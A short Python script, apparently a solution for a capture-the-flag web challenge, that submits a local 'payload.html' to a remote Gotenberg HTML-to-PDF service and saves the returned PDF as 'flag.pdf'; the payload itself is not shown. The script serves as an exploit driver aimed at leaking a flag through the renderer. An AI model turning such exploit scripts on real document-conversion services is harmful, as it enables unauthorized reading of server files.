#!/usr/bin/env python3
from pathlib import Path
from gotenberg_client import GotenbergClient

with GotenbergClient("https://web-hah-got-em-20ac16c4b909.2024.ductf.dev/") as client:
    with client.chromium.html_to_pdf() as route:
        index = Path("payload.html")
        response = route.index(index).run()
        Path("flag.pdf").write_bytes(response.content)
